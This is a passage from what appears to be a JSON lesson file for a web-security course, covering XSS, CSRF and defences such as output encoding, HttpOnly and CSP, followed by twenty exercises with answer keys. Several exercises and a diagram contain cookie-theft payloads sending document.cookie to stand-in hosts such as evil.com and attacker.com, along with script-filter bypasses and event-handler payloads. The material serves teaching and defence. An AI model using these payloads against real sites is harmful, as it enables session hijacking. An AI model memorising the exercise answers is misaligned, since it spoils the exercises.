4px 12px; border-radius: 4px;\">COOKIE THEFT via XSS</span>\n<pre style=\"margin-top: 8px;\">\n  Injected script:\n  <span style=\"color: #e74c3c;\">&lt;script&gt;new Image().src='http://evil.com?c='+document.cookie&lt;/script&gt;</span>\n       |\n       v\n  document.cookie returns: \"JSESSIONID=abc123; theme=dark\"\n       |\n       v\n  Browser loads: http://evil.com?c=JSESSIONID=abc123;theme=dark\n       |\n       v\n  <span style=\"color: #e74c3c;\">Attacker reads cookie from server log -> SESSION HIJACKED!</span>\n\n  <span style=\"color: #2ecc71; font-weight: bold;\">DEFENCE: HttpOnly flag</span>\n  Set-Cookie: JSESSIONID=abc123; <span style=\"color: #2ecc71;\">HttpOnly</span>\n  document.cookie returns: \"theme=dark\" (no JSESSIONID!)\n  <span style=\"color: #2ecc71;\">Cookie theft BLOCKED!</span>\n</pre>\n</div>\n\n<div style=\"border-top: 3px dashed #95a5a6; margin: 20px 0;\"></div>\n\n<div style=\"margin-bottom: 25px;\">\n<span style=\"background: #f39c12; color: white; padding: 4px 12px; border-radius: 4px;\">CSRF vs XSS COMPARISON</span>\n<pre style=\"margin-top: 8px;\">\n  <span style=\"color: #e74c3c;\">XSS:</span> Attacker injects CODE into the trusted site's page\n       Code READS data from the page (cookies, content)\n       Victim: page they are viewing is compromised\n       Fix: Output encoding + CSP\n\n  <span style=\"color: #f39c12;\">CSRF:</span> Attacker makes victim's browser SEND a request\n        Browser auto-attaches cookies to the request\n        Server thinks it is a legitimate request from the victim\n        Fix: CSRF tokens + SameSite cookies\n\n  <span style=\"color: #9b59b6;\">XSS + CSRF:</span> Attacker uses XSS to steal CSRF token\n              Then performs CSRF with the stolen token\n              <span style=\"color: #9b59b6;\">This is why you need BOTH defences!</span>\n</pre>\n</div>\n\n<div style=\"border-top: 3px dashed #95a5a6; margin: 20px 0;\"></div>\n\n<div style=\"margin-bottom: 25px;\">\n<span style=\"background: #2ecc71; color: white; padding: 4px 12px; border-radius: 4px;\">OUTPUT ENCODING - THE #1 XSS DEFENCE</span>\n<pre style=\"margin-top: 8px;\">\n  <span style=\"color: #e74c3c;\">WITHOUT encoding:</span>\n  Input:  &lt;script&gt;alert(1)&lt;/script&gt;\n  HTML:   &lt;p&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/p&gt;\n  Browser: <span style=\"color: #e74c3c;\">RUNS the script!</span>\n\n  <span style=\"color: #2ecc71;\">WITH encoding:</span>\n  Input:  &lt;script&gt;alert(1)&lt;/script&gt;\n  Encoded: &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;\n  HTML:   &lt;p&gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/p&gt;\n  Browser: <span style=\"color: #2ecc71;\">shows TEXT \"&lt;script&gt;alert(1)&lt;/script&gt;\"</span>\n\n  Encoding table:\n  <span style=\"color: #3498db;\">&lt;</span>  becomes  <span style=\"color: #2ecc71;\">&amp;lt;</span>    (blocks opening tags)\n  <span style=\"color: #3498db;\">&gt;</span>  becomes  <span style=\"color: #2ecc71;\">&amp;gt;</span>    (blocks closing tags)\n  <span style=\"color: #3498db;\">\"</span>  becomes  <span style=\"color: #2ecc71;\">&amp;quot;</span>  (blocks attribute escape)\n  <span style=\"color: #3498db;\">'</span>  becomes  <span style=\"color: #2ecc71;\">&amp;#x27;</span>  (blocks attribute escape)\n  <span style=\"color: #3498db;\">&amp;</span>  becomes  <span style=\"color: #2ecc71;\">&amp;amp;</span>   (blocks entity injection)\n</pre>\n</div>\n\n<div style=\"border-top: 3px dashed #95a5a6; margin: 20px 0;\"></div>\n\n<div style=\"margin-bottom: 25px;\">\n<span style=\"background: #3498db; color: white; padding: 4px 12px; border-radius: 4px;\">COMPLETE DEFENCE CHECKLIST - 7 LAYERS</span>\n<pre style=\"margin-top: 8px;\">\n  <span style=\"background: #2ecc71; color: white; padding: 2px 6px;\">Layer 1</span> Output Encoding (server-side)\n    Encode ALL user data before putting it in HTML.\n    &lt; &gt; \" ' & -> safe entity equivalents.\n\n  <span style=\"background: #2ecc71; color: white; padding: 2px 6px;\">Layer 2</span> Input Validation (server-side)\n    Whitelist expected characters/patterns.\n    Reject input that does not match.\n\n  <span style=\"background: #2ecc71; color: white; padding: 2px 6px;\">Layer 3</span> Content Security Policy (CSP)\n    script-src 'self' blocks inline scripts.\n    Even if encoding is missed, CSP blocks execution.\n\n  <span style=\"background: #2ecc71; color: white; padding: 2px 6px;\">Layer 4</span> HttpOnly Cookie Flag\n    Prevents JavaScript from reading session cookies.\n    XSS cannot steal session IDs.\n\n  <span style=\"background: #2ecc71; color: white; padding: 2px 6px;\">Layer 5</span> Secure Cookie Flag\n    Cookie only sent over HTTPS.\n    Prevents network interception.\n\n  <span style=\"background: #2ecc71; color: white; padding: 2px 6px;\">Layer 6</span> SameSite Cookie + CSRF Tokens\n    Prevents cross-site request forgery.\n    Forms must include secret token.\n\n  <span style=\"background: #2ecc71; color: white; padding: 2px 6px;\">Layer 7</span> Client-Side Sanitisation\n    Use textContent (not innerHTML).\n    DOMPurify for rich content.\n</pre>\n</div>\n\n<div style=\"border-top: 3px solid #2ecc71; margin: 20px 0;\"></div>\n\n<div style=\"background: #eafaf1; padding: 15px; border-radius: 8px; border-left: 5px solid #2ecc71;\">\n<span style=\"color: #2ecc71; font-weight: bold; font-size: 16px;\">REMEMBER - THE 5 GOLDEN RULES</span>\n<pre style=\"margin-top: 8px;\">\n  <span style=\"color: #2ecc71;\">Rule 1:</span> ALWAYS encode user data before putting it in HTML\n  <span style=\"color: #2ecc71;\">Rule 2:</span> Set HttpOnly + Secure + SameSite on session cookies\n  <span style=\"color: #2ecc71;\">Rule 3:</span> Use CSRF tokens on ALL state-changing forms\n  <span style=\"color: #2ecc71;\">Rule 4:</span> Add CSP headers: script-src 'self'\n  <span style=\"color: #2ecc71;\">Rule 5:</span> Use textContent (not innerHTML) in client-side JS\n</pre>\n</div>\n</div>"
+      },
+      "practice_exercises": [
+        {
+          "exercise_id": "ex_01",
+          "title": "Exercise 1: Trace an HTTP Request-Response",
+          "description": "Given an HTTP request, predict what HTML the server sends back and what the browser displays.",
+          "difficulty": "beginner",
+          "category": "Web & HTML Basics",
+          "estimated_minutes": 4,
+          "ai_intro": "Understanding how the web works is the foundation for understanding web attacks!",
+          "starter_code": "// A user visits: http://shop.com/greet?name=Alice\n//\n// Server code:\n// String name = request.getParameter(\"name\");\n// out.println(\"<html><body>\");\n// out.println(\"<h1>Hello, \" + name + \"!</h1>\");\n// out.println(\"</body></html>\");\n//\n// What HTTP request does the browser send?\n// GET _____\n//\n// What HTML does the server respond with?\n// _____\n//\n// What does the browser display?\n// _____",
+          "expected_output": "GET /greet?name=Alice HTTP/1.1\nHTML: <html><body><h1>Hello, Alice!</h1></body></html>\nBrowser displays: Hello, Alice! (as a heading)",
+          "hints": [
+            {
+              "message": "The browser sends a GET request to the URL path with parameters."
+            },
+            {
+              "message": "The server takes the 'name' parameter (Alice) and puts it in the HTML."
+            },
+            {
+              "message": "GET /greet?name=Alice. HTML: <h1>Hello, Alice!</h1>. Browser shows 'Hello, Alice!' as a heading."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_02",
+          "title": "Exercise 2: What Are Cookies?",
+          "description": "Explain what cookies are and identify the session cookie in a Set-Cookie header.",
+          "difficulty": "beginner",
+          "category": "Web & HTML Basics",
+          "estimated_minutes": 4,
+          "ai_intro": "Understanding how the web works is the foundation for understanding web attacks!",
+          "starter_code": "// The server sends this response header:\n// Set-Cookie: JSESSIONID=abc123xyz; Path=/; HttpOnly; Secure\n// Set-Cookie: theme=dark; Path=/\n// Set-Cookie: lang=en; Path=/\n//\n// Answer these questions:\n// 1. How many cookies are set? _____\n// 2. Which one is the session cookie? _____\n// 3. Which cookie(s) can JavaScript read? _____\n// 4. Which cookie(s) are sent over HTTP (not HTTPS)? _____\n// 5. Why is JSESSIONID the most important to protect? _____",
+          "expected_output": "1. Three cookies\n2. JSESSIONID (session identifier)\n3. theme and lang (NOT JSESSIONID because HttpOnly)\n4. theme and lang (JSESSIONID has Secure flag)\n5. Because it proves who you are - stealing it = account takeover",
+          "hints": [
+            {
+              "message": "Look at each Set-Cookie header. HttpOnly means JavaScript cannot read it."
+            },
+            {
+              "message": "Secure means only sent over HTTPS. JSESSIONID has both flags."
+            },
+            {
+              "message": "3 cookies. JSESSIONID is the session cookie. Only theme and lang are readable by JS (no HttpOnly)."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_03",
+          "title": "Exercise 3: Identify User Input in HTML",
+          "description": "Look at server code and identify where user input appears in the HTML output.",
+          "difficulty": "beginner",
+          "category": "Web & HTML Basics",
+          "estimated_minutes": 4,
+          "ai_intro": "Understanding how the web works is the foundation for understanding web attacks!",
+          "starter_code": "// Server code:\nString name = request.getParameter(\"name\");\nString color = request.getParameter(\"color\");\nString msg = request.getParameter(\"message\");\n\nout.println(\"<h1 style='color:\" + color + \"'>Welcome, \" + name + \"</h1>\");\nout.println(\"<p>\" + msg + \"</p>\");\nout.println(\"<input value='\" + name + \"' type='text'>\");\n\n// How many injection points are there? _____\n// List each: parameter -> HTML context\n// 1. _____\n// 2. _____\n// 3. _____\n// 4. _____",
+          "expected_output": "4 injection points:\n1. color -> CSS style attribute\n2. name -> HTML body (inside <h1>)\n3. msg -> HTML body (inside <p>)\n4. name -> HTML attribute (input value)",
+          "hints": [
+            {
+              "message": "Look for every place a variable from getParameter() appears in the out.println() calls."
+            },
+            {
+              "message": "name appears TWICE: once in the heading text and once in the input value attribute."
+            },
+            {
+              "message": "4 points: color in style, name in h1 text, msg in p text, name in input value. Each is a potential XSS vector."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_04",
+          "title": "Exercise 4: HTML Special Characters Quiz",
+          "description": "For each character, write its HTML entity equivalent.",
+          "difficulty": "beginner",
+          "category": "Web & HTML Basics",
+          "estimated_minutes": 4,
+          "ai_intro": "Understanding how the web works is the foundation for understanding web attacks!",
+          "starter_code": "// Write the HTML entity for each character:\n//\n// < -> _____\n// > -> _____\n// \" -> _____\n// ' -> _____\n// & -> _____\n//\n// Why must & be encoded FIRST when encoding? _____\n//\n// What does &lt;script&gt; display in the browser? _____\n// Does it execute? _____",
+          "expected_output": "< -> &lt;\n> -> &gt;\n\" -> &quot;\n' -> &#x27;\n& -> &amp;\n& must be first because otherwise &lt; would become &amp;lt;\nBrowser shows text: <script>  Does NOT execute.",
+          "hints": [
+            {
+              "message": "These are the 5 essential HTML entities for XSS prevention."
+            },
+            {
+              "message": "& is first because the other entities contain & in them. Encoding & last would double-encode."
+            },
+            {
+              "message": "< is &lt;, > is &gt;, \" is &quot;, ' is &#x27;, & is &amp;. &lt;script&gt; shows as text, never executes."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_05",
+          "title": "Exercise 5: Predict Browser Behaviour",
+          "description": "Given HTML snippets, predict what the browser does with each one.",
+          "difficulty": "beginner",
+          "category": "Web & HTML Basics",
+          "estimated_minutes": 4,
+          "ai_intro": "Understanding how the web works is the foundation for understanding web attacks!",
+          "starter_code": "// For each HTML snippet, predict: DISPLAYS TEXT or EXECUTES CODE?\n//\n// 1. <p>Hello World</p>\n//    Browser: _____\n//\n// 2. <p><script>alert(1)</script></p>\n//    Browser: _____\n//\n// 3. <p>&lt;script&gt;alert(1)&lt;/script&gt;</p>\n//    Browser: _____\n//\n// 4. <img src=x onerror=alert(1)>\n//    Browser: _____\n//\n// 5. <p>&lt;img src=x onerror=alert(1)&gt;</p>\n//    Browser: _____",
+          "expected_output": "1. Displays text 'Hello World'\n2. EXECUTES: runs alert(1) - XSS!\n3. Displays TEXT '<script>alert(1)</script>' - SAFE (encoded)\n4. EXECUTES: img fails to load, onerror runs alert(1) - XSS!\n5. Displays TEXT '<img src=x onerror=alert(1)>' - SAFE (encoded)",
+          "hints": [
+            {
+              "message": "Real HTML tags execute. HTML entities (&lt; &gt;) are displayed as text."
+            },
+            {
+              "message": "#2 and #4 have real HTML tags that the browser processes. #3 and #5 use entities."
+            },
+            {
+              "message": "2: executes (real script tag). 3: safe text (entities). 4: executes (onerror handler). 5: safe text (entities)."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_06",
+          "title": "Exercise 6: Write an encodeHTML Method",
+          "description": "Build your web security foundations.",
+          "difficulty": "beginner",
+          "category": "Web & HTML Basics",
+          "estimated_minutes": 5,
+          "ai_intro": "Every concept here is used by real web developers every day.",
+          "starter_code": "// Write a Java method that encodes the 5 dangerous HTML characters:\n\npublic static String encodeHTML(String input) {\n    // TODO: Handle null input\n    // TODO: Replace & with &amp; (FIRST!)\n    // TODO: Replace < with &lt;\n    // TODO: Replace > with &gt;\n    // TODO: Replace \" with &quot;\n    // TODO: Replace ' with &#x27;\n    return input;\n}",
+          "expected_output": "public static String encodeHTML(String input) {\n    if (input == null) return \"\";\n    return input.replace(\"&\", \"&amp;\").replace(\"<\", \"&lt;\")\n        .replace(\">\", \"&gt;\").replace(\"\\\"\", \"&quot;\").replace(\"'\", \"&#x27;\");\n}",
+          "hints": [
+            {
+              "message": "Start with null check. Then replace & first, then < > \" ' in order."
+            },
+            {
+              "message": "if (input == null) return \"\"; then chain .replace() calls."
+            },
+            {
+              "message": "Full method: null check, then replace(&,&amp;), replace(<,&lt;), replace(>,&gt;), replace(\",&quot;), replace(',&#x27;)"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_07",
+          "title": "Exercise 7: Trace Cookie Flow",
+          "description": "Build your web security foundations.",
+          "difficulty": "beginner",
+          "category": "Web & HTML Basics",
+          "estimated_minutes": 5,
+          "ai_intro": "Every concept here is used by real web developers every day.",
+          "starter_code": "// Trace the cookie flow:\n// 1. User logs in at https://bank.com/login\n// 2. Server responds: Set-Cookie: JSESSIONID=xyz; HttpOnly; Secure; Path=/\n// 3. User visits https://bank.com/account\n//\n// Does the browser send the cookie? _____\n// Why or why not? _____\n//\n// 4. User visits http://bank.com/account (HTTP, not HTTPS)\n// Does the browser send the cookie? _____\n// Why? _____\n//\n// 5. JavaScript on bank.com runs: alert(document.cookie)\n// What does it show? _____",
+          "expected_output": "3. YES (same domain, HTTPS, path matches)\n4. NO (Secure flag prevents sending over HTTP)\n5. Shows nothing related to JSESSIONID (HttpOnly blocks JS access)",
+          "hints": [
+            {
+              "message": "The Secure flag means cookie only sent over HTTPS. HttpOnly means no JavaScript access."
+            },
+            {
+              "message": "Step 4: HTTP (not HTTPS) + Secure flag = cookie NOT sent."
+            },
+            {
+              "message": "HTTPS: cookie sent. HTTP: cookie NOT sent (Secure flag). document.cookie: no JSESSIONID (HttpOnly)."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_08",
+          "title": "Exercise 8: Same-Origin Policy Basics",
+          "description": "Build your web security foundations.",
+          "difficulty": "beginner",
+          "category": "Web & HTML Basics",
+          "estimated_minutes": 5,
+          "ai_intro": "Every concept here is used by real web developers every day.",
+          "starter_code": "// The Same-Origin Policy prevents JavaScript on one site from\n// accessing data on another site.\n//\n// Can JavaScript on evil.com read cookies from bank.com? _____\n// Can JavaScript on bank.com read cookies from bank.com? _____\n// Can evil.com make the browser SEND a request to bank.com? _____\n// Can evil.com READ the response from bank.com? _____\n//\n// This is why XSS is dangerous:\n// If attacker's script runs ON bank.com's page, it IS bank.com's origin!\n// So it CAN read bank.com's cookies. Explain why: _____",
+          "expected_output": "evil.com cannot read bank.com cookies (different origin).\nbank.com JS CAN read bank.com cookies (same origin).\nevil.com CAN make browser send request to bank.com (CSRF!).\nevil.com CANNOT read the response (blocked by Same-Origin Policy).\nXSS is dangerous because the script runs IN bank.com's context = same origin.",
+          "hints": [
+            {
+              "message": "Same-Origin Policy: scripts can only access data from the SAME origin (protocol + domain + port)."
+            },
+            {
+              "message": "A browser CAN send cross-origin requests (that is how CSRF works) but CANNOT read the responses."
+            },
+            {
+              "message": "XSS bypasses Same-Origin Policy because the injected script runs WITHIN the target's origin."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_09",
+          "title": "Exercise 9: HTTP vs HTTPS for Cookies",
+          "description": "Build your web security foundations.",
+          "difficulty": "intermediate",
+          "category": "Web & HTML Basics",
+          "estimated_minutes": 5,
+          "ai_intro": "Every concept here is used by real web developers every day.",
+          "starter_code": "// Without the Secure flag:\n// Set-Cookie: JSESSIONID=abc123\n// Scenario: User is on public Wi-Fi at a coffee shop\n// They visit http://bank.com (not https)\n//\n// Can an attacker on the same Wi-Fi intercept the cookie? _____\n// How? _____\n// What can they do with the stolen cookie? _____\n//\n// With the Secure flag:\n// Set-Cookie: JSESSIONID=abc123; Secure\n// Does the browser send the cookie over HTTP? _____\n// Is the attack still possible? _____",
+          "expected_output": "Yes, attacker can intercept (unencrypted HTTP, packet sniffing).\nThey can impersonate the user (session hijacking).\nWith Secure flag: browser does NOT send cookie over HTTP.\nAttack blocked.",
+          "hints": [
+            {
+              "message": "Without Secure, the cookie travels in plaintext over HTTP. Anyone on the network can see it."
+            },
+            {
+              "message": "On public Wi-Fi, tools like Wireshark can capture unencrypted HTTP traffic."
+            },
+            {
+              "message": "With Secure flag: browser refuses to send the cookie over HTTP. The attacker sees nothing."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_10",
+          "title": "Exercise 10: Spot the Missing Encoding",
+          "description": "Build your web security foundations.",
+          "difficulty": "intermediate",
+          "category": "Web & HTML Basics",
+          "estimated_minutes": 5,
+          "ai_intro": "Every concept here is used by real web developers every day.",
+          "starter_code": "// Find ALL places where output encoding is MISSING:\n\nString user = req.getParameter(\"user\");\nString role = req.getParameter(\"role\");\nString bio = getUserBio(user); // from database\n\nout.println(\"<h1>Profile: \" + encodeHTML(user) + \"</h1>\");      // Line 1\nout.println(\"<p>Role: \" + role + \"</p>\");                        // Line 2\nout.println(\"<div class='bio'>\" + bio + \"</div>\");               // Line 3\nout.println(\"<input value='\" + encodeHTML(user) + \"'>\");         // Line 4\nout.println(\"<a href='/profile?user=\" + user + \"'>Link</a>\");    // Line 5\n\n// Missing encoding on lines: _____\n// For each, what attack is possible? _____",
+          "expected_output": "Missing on: Line 2 (role not encoded), Line 3 (bio not encoded), Line 5 (user not encoded in URL).\nLine 2: XSS in HTML body. Line 3: Stored XSS from database. Line 5: XSS in URL attribute.",
+          "hints": [
+            {
+              "message": "Check each line: is the variable wrapped in encodeHTML() before going into out.println()?"
+            },
+            {
+              "message": "Line 2: role is raw. Line 3: bio from database is raw. Line 5: user in URL is raw."
+            },
+            {
+              "message": "Lines 2,3,5 are missing encoding. Line 3 is especially dangerous: data from the database can contain stored XSS."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_11",
+          "title": "Exercise 11: Craft a Reflected XSS Payload",
+          "description": "Master XSS attack techniques.",
+          "difficulty": "beginner",
+          "category": "XSS Attacks",
+          "estimated_minutes": 5,
+          "ai_intro": "Understanding attacks is the first step to building defences!",
+          "starter_code": "// Vulnerable servlet:\n// String q = request.getParameter(\"q\");\n// out.println(\"<p>Results for: \" + q + \"</p>\");\n//\n// Write 3 different XSS payloads:\n//\n// Payload 1 (alert box):\n// q = _____\n//\n// Payload 2 (cookie theft):\n// q = _____\n//\n// Payload 3 (page redirect):\n// q = _____",
+          "expected_output": "1. <script>alert('XSS')</script>\n2. <script>new Image().src='http://evil.com?c='+document.cookie</script>\n3. <script>window.location='http://evil.com'</script>",
+          "hints": [
+            {
+              "message": "A basic alert payload uses <script>alert('XSS')</script>."
+            },
+            {
+              "message": "For cookie theft, use new Image().src with document.cookie in the URL."
+            },
+            {
+              "message": "1: <script>alert('XSS')</script>. 2: <script>new Image().src='http://evil.com?c='+document.cookie</script>. 3: <script>window.location='http://evil.com'</script>"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_12",
+          "title": "Exercise 12: Trace Stored XSS Step by Step",
+          "description": "Master XSS attack techniques.",
+          "difficulty": "beginner",
+          "category": "XSS Attacks",
+          "estimated_minutes": 5,
+          "ai_intro": "Understanding attacks is the first step to building defences!",
+          "starter_code": "// Trace each step of a stored XSS attack:\n//\n// Step 1: Attacker posts profile bio:\n// bio = \"I love coding! <script>fetch('http://evil.com?c='+document.cookie)</script>\"\n//\n// Step 2: Server saves to database:\n// What SQL runs? _____\n// Is the script stored? _____\n//\n// Step 3: Victim views attacker's profile\n// Server reads bio from DB and outputs: out.println(\"<div>\" + bio + \"</div>\")\n// What HTML does the victim receive? _____\n//\n// Step 4: What does the victim's browser do? _____\n// Step 5: Where do the cookies go? _____\n// Step 6: How many victims are affected? _____",
+          "expected_output": "Step 2: INSERT INTO profiles (bio) VALUES ('I love coding! <script>...'). Yes stored.\nStep 3: <div>I love coding! <script>fetch('http://evil.com?c='+document.cookie)</script></div>\nStep 4: Executes the script\nStep 5: To evil.com (attacker's server)\nStep 6: EVERY visitor who views the profile",
+          "hints": [
+            {
+              "message": "The bio is stored in the database including the <script> tag."
+            },
+            {
+              "message": "When ANY user views the profile, the server reads the bio and puts it in HTML."
+            },
+            {
+              "message": "The script executes for EVERY visitor. Stored XSS is a one-to-many attack."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_13",
+          "title": "Exercise 13: DOM-Based XSS via innerHTML",
+          "description": "Master XSS attack techniques.",
+          "difficulty": "beginner",
+          "category": "XSS Attacks",
+          "estimated_minutes": 5,
+          "ai_intro": "Understanding attacks is the first step to building defences!",
+          "starter_code": "// VULNERABLE JavaScript:\n// var search = new URLSearchParams(location.search).get('q');\n// document.getElementById('results').innerHTML = \n//     'Showing results for: ' + search;\n//\n// Write a URL that triggers DOM-based XSS:\n// URL: http://site.com/search?q=_____\n//\n// What does innerHTML insert into the page? _____\n// Why does the server NOT see this attack? _____\n// How to fix: replace innerHTML with _____",
+          "expected_output": "URL: http://site.com/search?q=<img src=x onerror=alert(1)>\ninnerHTML creates a real img tag with onerror handler.\nServer does not see it because the payload is processed only in the browser's JS.\nFix: use textContent instead of innerHTML",
+          "hints": [
+            {
+              "message": "innerHTML interprets HTML tags. Anything in the query becomes real HTML."
+            },
+            {
+              "message": "The URL fragment (#) or query parameter is read by JavaScript, not sent to the server."
+            },
+            {
+              "message": "Fix: textContent treats everything as plain text, never as HTML."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_14",
+          "title": "Exercise 14: XSS Without <script> Tags",
+          "description": "Master XSS attack techniques.",
+          "difficulty": "intermediate",
+          "category": "XSS Attacks",
+          "estimated_minutes": 5,
+          "ai_intro": "Understanding attacks is the first step to building defences!",
+          "starter_code": "// The application blocks <script> tags but nothing else.\n// Write 5 XSS payloads that do NOT use <script>:\n//\n// 1. Using <img>: _____\n// 2. Using <svg>: _____\n// 3. Using <body>: _____\n// 4. Using <input>: _____\n// 5. Using <details>: _____",
+          "expected_output": "1. <img src=x onerror=alert(1)>\n2. <svg onload=alert(1)>\n3. <body onload=alert(1)>\n4. <input onfocus=alert(1) autofocus>\n5. <details open ontoggle=alert(1)>",
+          "hints": [
+            {
+              "message": "Many HTML tags have event handlers that can execute JavaScript."
+            },
+            {
+              "message": "<img src=x onerror=...> triggers when the image fails to load."
+            },
+            {
+              "message": "img(onerror), svg(onload), body(onload), input(onfocus+autofocus), details(ontoggle)"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_15",
+          "title": "Exercise 15: Cookie Theft Payload",
+          "description": "Master XSS attack techniques.",
+          "difficulty": "intermediate",
+          "category": "XSS Attacks",
+          "estimated_minutes": 5,
+          "ai_intro": "Understanding attacks is the first step to building defences!",
+          "starter_code": "// Write a complete cookie theft payload that:\n// 1. Reads document.cookie\n// 2. Sends it to http://attacker.com/steal\n// 3. Does it SILENTLY (no visible changes to the page)\n//\n// Your payload:\n// <script>\n// _____\n// </script>\n//\n// What does the attacker see in their server logs? _____\n// How does HttpOnly prevent this? _____",
+          "expected_output": "new Image().src='http://attacker.com/steal?c='+encodeURIComponent(document.cookie);\nAttacker sees: GET /steal?c=JSESSIONID%3Dabc123\nHttpOnly: document.cookie does not include JSESSIONID, theft fails",
+          "hints": [
+            {
+              "message": "Use new Image().src to make a silent HTTP request to the attacker's server."
+            },
+            {
+              "message": "encodeURIComponent ensures special characters in cookies don't break the URL."
+            },
+            {
+              "message": "Payload: new Image().src='http://attacker.com/steal?c='+encodeURIComponent(document.cookie);"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_16",
+          "title": "Exercise 16: XSS in HTML Attributes",
+          "description": "Master XSS attack techniques.",
+          "difficulty": "intermediate",
+          "category": "XSS Attacks",
+          "estimated_minutes": 7,
+          "ai_intro": "Understanding attacks is the first step to building defences!",
+          "starter_code": "// Vulnerable code:\n// out.println(\"<a href='\" + userLink + \"'>Click here</a>\");\n//\n// Normal: userLink = \"http://example.com\"\n// HTML: <a href='http://example.com'>Click here</a>\n//\n// Write an attack payload for userLink:\n// userLink = _____\n// Resulting HTML: _____\n// What happens when victim clicks? _____\n//\n// Write a second payload using javascript: protocol:\n// userLink = _____",
+          "expected_output": "userLink = javascript:alert(document.cookie)\nHTML: <a href='javascript:alert(document.cookie)'>Click here</a>\nVictim clicks -> JavaScript executes!\nAlternative: ' onclick='alert(1)' x='",
+          "hints": [
+            {
+              "message": "The javascript: protocol in href executes JavaScript when clicked."
+            },
+            {
+              "message": "Alternatively, break out of the attribute with ' and add an event handler."
+            },
+            {
+              "message": "javascript:alert(document.cookie) or ' onclick='alert(1)' x='"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_17",
+          "title": "Exercise 17: Bypass a Script Tag Filter",
+          "description": "Master XSS attack techniques.",
+          "difficulty": "intermediate",
+          "category": "XSS Attacks",
+          "estimated_minutes": 7,
+          "ai_intro": "Understanding attacks is the first step to building defences!",
+          "starter_code": "// Filter: removes all occurrences of <script and </script>\nfunction filter(input) {\n    return input.replace(/<script/gi, '').replace(/<\\/script>/gi, '');\n}\n//\n// Bypass 1 (nested): _____\n// After filter: _____\n//\n// Bypass 2 (different tag): _____\n// After filter: _____\n//\n// Why is filtering always weaker than encoding? _____",
+          "expected_output": "Bypass 1: <scr<scriptipt>alert(1)</scr</script>ipt> -> <script>alert(1)</script>\nBypass 2: <img src=x onerror=alert(1)> -> unchanged (filter only targets script)\nFiltering fails because there are infinite bypass techniques. Encoding makes ALL tags harmless.",
+          "hints": [
+            {
+              "message": "Nested tags: put <script inside another <script so removing the outer one reveals the inner."
+            },
+            {
+              "message": "Different tags bypass filters that only target <script>."
+            },
+            {
+              "message": "Encoding converts ALL < to &lt; so NO tag of any kind can form. That's why encoding beats filtering."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_18",
+          "title": "Exercise 18: Identify XSS Type",
+          "description": "Master XSS attack techniques.",
+          "difficulty": "advanced",
+          "category": "XSS Attacks",
+          "estimated_minutes": 7,
+          "ai_intro": "Understanding attacks is the first step to building defences!",
+          "starter_code": "// For each scenario, identify: REFLECTED, STORED, or DOM-BASED XSS?\n//\n// 1. Search results page includes query from URL: _____\n// 2. Forum comment contains <script> tag: _____\n// 3. JavaScript reads location.hash and uses innerHTML: _____\n// 4. Error page shows the invalid URL you entered: _____\n// 5. User profile bio contains malicious HTML: _____\n// 6. Client-side template renders user data unsafely: _____",
+          "expected_output": "1. REFLECTED, 2. STORED, 3. DOM-BASED, 4. REFLECTED, 5. STORED, 6. DOM-BASED",
+          "hints": [
+            {
+              "message": "Reflected: payload comes from the request URL. Stored: payload from database. DOM: payload processed by client JS."
+            },
+            {
+              "message": "If the server stores the malicious data -> stored. If it just reflects it back -> reflected."
+            },
+            {
+              "message": "1:REFLECTED 2:STORED 3:DOM 4:REFLECTED 5:STORED 6:DOM"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_19",
+          "title": "Exercise 19: XSS via Event Handlers",
+          "description": "Master XSS attack techniques.",
+          "difficulty": "advanced",
+          "category": "XSS Attacks",
+          "estimated_minutes": 7,
+          "ai_intro": "Understanding attacks is the first step to building defences!",
+          "starter_code": "// Write XSS payloads using ONLY event handlers (no <script> tag):\n//\n// 1. onmouseover: _____\n// 2. onfocus with autofocus: _____\n// 3. onerror on img: _____\n// 4. onload on svg: _____\n// 5. onclick on a div: _____\n//\n// Which of these execute WITHOUT user interaction? _____",
+          "expected_output": "2,3,4 execute without interaction (autofocus, onerror, onload). Others need mouse/click.",
+          "hints": [
+            {
+              "message": "Event handlers like onerror and onload fire automatically without user action."
+            },
+            {
+              "message": "autofocus makes the input get focus immediately, triggering onfocus."
+            },
+            {
+              "message": "Auto-execute: onfocus+autofocus, onerror on broken img, onload on svg. Others need interaction."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_20",
+          "title": "Exercise 20: Self-Replicating XSS Concept",
+          "description": "Master XSS attack techniques.",
+          "difficulty": "advanced",
+          "category": "XSS Attacks",
+          "estimated_minutes": 7,
+          "ai_intro": "Understanding attacks is the first step to building defences!",
+          "starter_code": "// The Samy worm copied itself to every viewer's profile.\n// Explain the concept:\n//\n// Step 1: Worm code is on Attacker's profile\n// Step 2: Victim A views Attacker's profile\n// Step 3: Worm executes in Victim A's browser\n// Step 4: Worm copies itself to _____\n// Step 5: Victim B views Victim A's profile\n// Step 6: _____\n// Step 7: This creates _____ growth\n//\n// How many victims after 10 generations if each infects 10 others?\n// Answer: _____",
+          "expected_output": "Step 4: Victim A's profile\nStep 6: Worm executes in Victim B's browser and copies to Victim B's profile\nStep 7: Exponential growth\n10 generations at 10 each: 10^10 = 10 billion (theoretical max)",
+          "hints": [
+            {
+              "message": "The worm reads its own code and writes it to the viewer's profile."
+            },
+            {
+              "message": "Each infected profile becomes a new source of infection."
+            },
+            {
+              "message": "Exponential: each victim infects more victims. 10^10 is theoretical, but Samy hit 1 million in 20 hours."
+            }
+          ]
+        },
+        {
